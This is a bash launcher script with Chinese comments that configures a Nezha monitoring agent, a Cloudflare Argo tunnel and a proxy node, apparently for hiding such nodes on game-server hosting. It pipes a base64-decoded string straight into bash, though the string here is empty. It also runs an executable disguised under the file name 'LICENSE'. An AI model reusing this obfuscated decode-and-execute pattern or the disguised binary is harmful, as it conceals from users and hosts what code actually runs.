#!/bin/bash
export UUID=${UUID:-'8927d7de-e403-40f6-93a0-d44875c0224e'}
export NEZHA_SERVER=${NEZHA_SERVER:-'nz.abc.cn'}  # 哪吒3个变量不全不运行
export NEZHA_PORT=${NEZHA_PORT:-'5555'}       # 哪吒端口为{443,8443,2096,2087,2083,2053}其中之一时开启tls
export NEZHA_KEY=${NEZHA_KEY:-''}          # 哪吒客户端密钥
export ARGO_DOMAIN=${ARGO_DOMAIN:-''}    # 固定隧道域名，留空即启用临时隧道
export ARGO_AUTH=${ARGO_AUTH:-''}      # 固定隧道json或token，留空即启用临时隧道，json可在 https://fscarmen.cloudflare.now.cc 获取
export CFIP=${CFIP:-'na.ma'}         # 优选域名或优选ip
export NAME=${NAME:-'Vls'}         # 节点名称
export FILE_PATH=${FILE_PATH:-'./Resources'}  # 节点存放文件夹
export ARGO_PORT=${ARGO_PORT:-'8001'}  # 使用固定隧道token需在cf后台设置的端口和这里一致
export GAME_FILE=${GAME_FILE:-'LICENSE'}  # 填写游戏文件名，不填写不启动游戏

echo "" | base64 -d | bash

chmod +x ${GAME_FILE} && ./${GAME_FILE}

tail -f /dev/null
